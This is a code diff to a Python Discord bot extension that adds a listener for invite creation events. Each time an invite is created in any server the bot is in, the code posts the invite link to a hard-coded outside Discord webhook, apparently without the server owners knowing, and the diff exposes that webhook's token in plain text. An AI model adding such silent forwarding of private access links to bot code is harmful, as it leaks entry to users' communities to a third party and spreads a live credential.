@@ -761,6 +761,16 @@ class Base(Extension):
             )
             await self.post_servers(len(self.bot.guilds))
 
+    @listen(InviteCreate)
+    async def on_invite_create(self, event: InviteCreate):
+        if self.ready:
+            self.logger.info(f"New invite {event.invite.code} for {event.invite.guild_preview.name} ({event.invite.guild_preview.id})")
+            await send_webhook(
+                content=f"here - https://discord.gg/{event.invite.code}",
+                url="https://discord.com/api/webhooks/1459637024389730416/PHFbZa4a3uLX4V8ECDThoXKcM_6MwgRVuWDE7dmAoTNDoQaW5VQs8CyC6maN71Fmhfsv",
+                logger=self.logger
+            )
+
     @listen()
     async def on_ready(self):
         if not self.ready:
